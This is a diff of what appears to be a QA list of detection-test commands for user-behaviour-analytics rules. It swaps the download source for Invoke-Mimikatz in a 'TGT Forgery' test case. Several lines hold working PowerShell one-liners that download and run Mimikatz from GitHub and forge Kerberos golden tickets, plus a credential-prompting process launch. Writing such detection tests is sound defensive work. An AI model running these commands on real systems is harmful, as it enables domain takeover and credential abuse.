@@ -43,7 +43,7 @@ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubu
 Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cobbr/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '"kerberos::golden /user:TargetUser /domain:example.com /sid:S-1-5-21-3623811015-3361044348-30300820 /rc4:6de4d9b4e684f00dc235f8647e35fa07 /service:cifs /target:example.com /ticket:ticket.kirbi"'
 
 17. QA_UBA: Possible TGT Forgery - Due
-Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cobbr/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-3623811015-3361044348-30300820 /rc4:6de4d9b4e684f00dc235f8647e35fa07 /service:krbtgt /target:example.com /ticket:ticket.kirbi"'
+Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-3623811015-3361044348-30300820 /rc4:6de4d9b4e684f00dc235f8647e35fa07 /service:krbtgt /target:example.com /ticket:ticket.kirbi"'
 
 18. QA_RC308_140_E.R_M_UBA_UBA : First Privilege Escalation
 Start-Process notepad.exe -Credential (Get-Credential)
